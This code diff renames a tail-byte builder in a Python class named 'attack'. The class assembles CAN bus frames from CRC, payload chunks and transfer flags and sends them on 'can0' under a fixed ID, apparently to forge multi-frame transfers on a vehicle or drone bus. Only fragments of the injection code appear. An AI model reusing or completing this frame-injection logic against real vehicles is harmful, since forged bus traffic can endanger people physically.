@@ -9,7 +9,8 @@ class CAN_ID:
 
 
 class CAN_PAYLOAD:
-    def build(s, e, t, id):
+
+    def build_tail(s, e, t, id):
         return f'{(s << 7) + (e << 6) + (t << 5) + id:02X}'
 
 
@@ -29,7 +30,7 @@ class attack:
                     'can0', 
                     10015501, 
                     f'{CRC} {" ".join(payload)}', 
-                    CAN_PAYLOAD.build(
+                    CAN_PAYLOAD.build_tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -42,7 +43,7 @@ class attack:
                     'can0', 
                     10015501, 
                     f'{CRC} {" ".join(payload[ : 5 ])}', 
-                    CAN_PAYLOAD.build(
+                    CAN_PAYLOAD.build_tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -59,7 +60,7 @@ class attack:
                         'can0',
                         10015501,
                         " ".join(payload[ : 7 ]), 
-                        CAN_PAYLOAD.build(
+                        CAN_PAYLOAD.build_tail(
                             transfer_start, 
                             transfer_end, 
                             toggle, 
@@ -76,7 +77,7 @@ class attack:
                 'can0', 
                 10015501, 
                 " ".join(payload), 
-                CAN_PAYLOAD.build(
+                CAN_PAYLOAD.build_tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -117,7 +118,7 @@ class attack:
                 'can0', 
                 10015501, 
                 f'{" ".join(payload)}', 
-                CAN_PAYLOAD.build(
+                CAN_PAYLOAD.build_tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
